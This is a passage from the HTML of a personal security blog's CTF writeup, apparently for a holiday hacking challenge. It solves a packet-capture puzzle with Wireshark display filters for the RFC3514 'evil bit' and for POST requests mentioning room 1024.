</code></pre><p>Let's put <code>Registration: True</code> in the file and it works.</p><p>Tinsel hint:</p><blockquote><p>Are you familiar with <a href=https://datatracker.ietf.org/doc/html/rfc3514 target=_blank rel="noreferrer noopener">RFC3514</a>?</p><p>Wireshark uses a different name for the Evil Bit: <code>ip.flags.rb</code>.</p><p>HTTP responses are often gzip compressed. Fortunately, Wireshark decompresses
them for us automatically.</p><p>You can search for strings in Wireshark fields using
<a href=https://wiki.wireshark.org/DisplayFilters target=_blank rel="noreferrer noopener">display filters</a> with the contains keyword.</p></blockquote><h2 id=customer-complaint-analysis>Customer Complaint Analysis
<a class=header-link href=#customer-complaint-analysis><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>Open the pcap file in Wireshark.</p><p>Three trolls in alphabetical order who complained about the human.</p><p>We can filter POST methods with <code>http.request.method == POST</code> which returns 16.
But trolls have to be RFC3514 compliant and have the security flag set. Add this
to the Wireshark filter to only see requests from trolls.</p><p><code>http.request.method == POST and ip.flags.rb</code> has the same results.</p><p>Looking in the complaints, we see a complaints from a human in room 1024. So
let's search for HTTP requests that have <code>1024</code> in them.</p><p><code>http contains "1024"</code> returns four results. One is the human complaining and
the other three are trolls. In alphabetical order: <code>Flud Hagg Yaqh</code>.</p></div><footer><p class=meta><span class="byline author vcard">Posted by <span class=fn>Parsia</span></span>
<time>Jan 21, 2022</time></span></p><p class=meta><a class="basic-alignment left" href=https://parsiya.net/blog/2021-12-20-rce-in-visual-studio-codes-remote-wsl-for-fun-and-negative-profit/ title="RCE in Visual Studio Code's Remote WSL for Fun and Negative Profit">RCE in Visual Studio Code's Remote WSL for Fun and Negative Profit</a>
<a class="basic-alignment right" href=https://parsiya.net/blog/2022-02-07-security-nightmares-of-game-package-managers/ title="Security Nightmares of Game Package Managers">Security Nightmares of Game Package Managers</a></p><div id=disqus_thread></div><script type=application/javascript>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//parsiya.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></footer></article></div><aside class="sidebar thirds"><section class="first odd"><h1>Who am I?</h1><p><p>I am Parsia, a senior security engineer at <a href=https://www.ea.com/security target=_blank rel="noreferrer noopener">Electronic Arts</a>.</p><p>I write about application security, reverse engineering,
Go, cryptography, and (obviously) videogames.</p><p>Click on <a href=/about/>About Me!</a> to know more.</p></p></section><ul class=sidebar-nav><li class=sidebar-nav-item><a target=_blank rel="noopener noreferrer" href=https://github.com/parsiya/ title=https://github.com/parsiya/><i class="fa fa-github fa-3x"></i></a>
<a target=_blank rel="noopener noreferrer" href=https://twitter.com/cryptogangsta/ title=https://twitter.com/cryptogangsta/><i class="fa fa-twitter fa-3x"></i></a>
<a target=_blank rel="noopener noreferrer" href=https://keybase.io/parsiya/ title=https://keybase.io/parsiya/><i class="fa fa-keybase fa-3x"></i></a>
<a target=_blank rel="noopener noreferrer" href=https://www.linkedin.com/in/parsiya title=https://www.linkedin.com/in/parsiya><i class="fa fa-linkedin fa-3x"></i></a></li></ul><section class=odd><h1>Collections</h1><li><a href=https://parsiya.net/categories/thick-client-proxying/ title="Thick Client Proxying">Thick Client Proxying</a></li><li><a href=https://parsiya.net/categories/writeup/ title=CTFs/Writeups>CTFs/Writeups</a></li><li><a href=https://parsiya.net/categories/attack-surface-analysis/ title="Attack Surface Analysis">Attack Surface Analysis</a></li><li><a href=https://parsiya.net/categories/bug-bounty/ title="Bug Bounty">Bug Bounty</a></li><li><a href=https://parsiya.net/categories/go/ title=Go/Golang>Go/Golang</a></li><li><a href=https://parsiya.net/categories/blockchain/ title=Blockchain>Blockchain</a></li><li><a href=https://parsiya.net/categories/burp-extension/ title="Burp Extension Development">Burp Extension Development</a></li><li><a href=https://parsiya.net/categories/automation/ title=Automation>Automation</a></li><li><a href=https://parsiya.net/categories/reverse-engineering/ title="Reverse Engineering">Reverse Engineering</a></li><li><a href=https://parsiya.net/categories/crypto/ title=Crypto(graphy)>Crypto(graphy)</a></li><li><a href=https://parsiya.net/categories/winappdbg/ title=WinAppDbg>WinAppDbg</a></li><li><a href=https://awsome.pw title="AWSome.pw - S3 bucket squatting - my very legit branded vulnerability">AWSome.pw - S3 bucket squatting - my very legit branded vulnerability</a></li></section></aside></div></div><footer role=contentinfo><p>Copyright &copy; 2022 Parsia - <a href=https://parsiya.net/license/>License</a> -
<span class=credit>Powered by <a target=_blank href=https://gohugo.io rel="noopener noreferrer">Hugo</a> and <a target=_blank href=https://github.com/parsiya/hugo-octopress/ rel="noopener noreferrer">Hugo-Octopress</a> theme.</p></footer></body></html>